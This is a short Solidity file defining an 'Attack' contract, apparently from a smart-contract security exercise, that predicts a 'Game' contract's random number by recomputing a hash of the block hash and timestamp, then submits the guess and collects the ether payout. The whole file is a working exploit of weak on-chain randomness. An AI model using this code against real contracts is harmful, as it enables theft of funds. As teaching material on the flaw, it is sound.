//SPDX-License-Provider:MIT
pragma solidity ^0.8.19;

import "./Game.sol";

contract Attack {
    Game game;

    // Creates an instance of Game contract with the help of `gameAddress`
    constructor(address gameAddress) {
        game = Game(gameAddress);
    }

    // Attack the 'Game' contract by guessing the exact number because 'blockhash' and 'block.timestamp' is accessible publicaly

    function attack() public {
        uint256 _guess = uint256(
            keccak256(abi.encodePacked(blockhash(block.number), block.timestamp)
            )
        );
        game.guess(_guess);
    }

    // Gets called when the contract receives ether
    receive() external payable {}

}